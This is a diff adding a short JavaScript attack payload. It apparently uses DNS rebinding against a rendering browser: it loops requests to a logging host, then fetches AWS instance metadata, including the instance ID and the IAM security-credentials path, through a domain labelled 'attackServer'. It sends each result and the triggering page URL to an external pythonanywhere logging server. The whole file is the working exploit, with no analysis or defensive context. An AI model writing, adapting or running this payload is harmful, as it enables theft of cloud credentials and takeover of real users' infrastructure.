@@ -1,0 +1,36 @@
+var logTimeServer = 'reporascal0.pythonanywhere.com';
+var attackServer = 'cryptokryptonite.xyz';
+
+function log(data) {
+    var sreq = new XMLHttpRequest();
+    sreq.open('GET', 'http://' + logTimeServer + '/log?msg=' + encodeURI(data), true);
+    sreq.send();
+}
+
+function get(url) {
+    try {
+        var req = new XMLHttpRequest();
+        req.open('GET', url, false);
+        req.setRequestHeader('X-Aws-Ec2-Metadata-Token-Ttl-Seconds', '21600'); // For AWS IMDSv2
+        req.send(null);
+        if(req.status == 200)
+            return req.responseText;
+        else
+            return '[failed status=' + req.status + ']';
+    } catch(err) {
+        log(err);
+    }
+    return null;
+}
+
+log('Triggered in ' + window.location.href);
+
+for(var i = 0; i < 60; ++i) {
+    log('Loop ' + i);
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://' + logTimeServer + '/', false);
+    req.send();
+}
+
+log('Instance ID: ' + get('http://' + attackServer + '/latest/meta-data/instance-id'));
+log('IAM Role: ' + get('http://' + attackServer + '/latest/meta-data/iam/security-credentials/'));
